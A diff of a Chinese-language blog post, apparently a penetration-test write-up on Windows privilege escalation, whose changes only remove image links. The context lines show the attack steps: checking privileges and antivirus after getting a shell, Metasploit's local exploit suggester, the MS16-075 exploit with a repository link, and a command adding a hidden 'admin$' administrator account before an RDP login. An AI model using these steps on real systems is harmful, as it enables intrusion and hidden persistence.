@@ -19,13 +19,9 @@ finished: true
 
 拿到shell 查看了一个当前的权限 `whoami`
 
-![tiquan1](/static/img/tiquan1.png)
-
 
 
 查看进程 `tasklist` 发现无杀毒软件。
-
-![tiquan2](/static/img/tiquan2.png)
 
 
 
@@ -114,13 +110,9 @@ use multi/recon/local_exploit_suggester
 
 然后去之前的提权辅助页面进行 ms16_075 搜索看能不能利用
 
-![tiquan4](/static/img/tiquan4.png)
-
 链接：https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075
 
 利用方式在链接中给出来了 **RT：**
-
-![tiquan5](/static/img/tiquan5.png)
 
 ```bash
 msf5 exploit(multi/handler) > set ExitOnsession false
@@ -217,11 +209,7 @@ net user admin$ Passw@rd1. /add && net localgroup administrators admin$ /add
 
 **RDP远程桌面端口查询**
 
-![](/static/img/tiquan6.png)
-
 **远程连接 RT:**
-
-![tiquan7](/static/img/tiquan7.png)
 
 
 
